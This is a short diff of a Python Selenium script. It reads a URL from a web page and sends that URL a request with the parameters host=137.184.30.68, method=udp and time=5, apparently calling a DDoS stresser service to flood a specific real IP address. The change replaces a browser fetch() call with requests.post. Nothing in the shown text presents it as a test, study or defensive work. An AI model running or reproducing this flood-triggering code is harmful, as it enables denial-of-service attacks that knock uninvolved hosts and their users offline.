@@ -40,7 +40,8 @@ def execute():
   time.sleep(10)
   url = driver.execute_script("return document.getElementById('weburl').innerText;")
   print(url)
-  driver.execute_script("fetch('"+url+"?host=137.184.30.68&method=udp&time=5')")
+  time.sleep(2)
+  requests.post(url+"?host=137.184.30.68&method=udp&time=5")
   time.sleep(10)
   driver.quit();
 
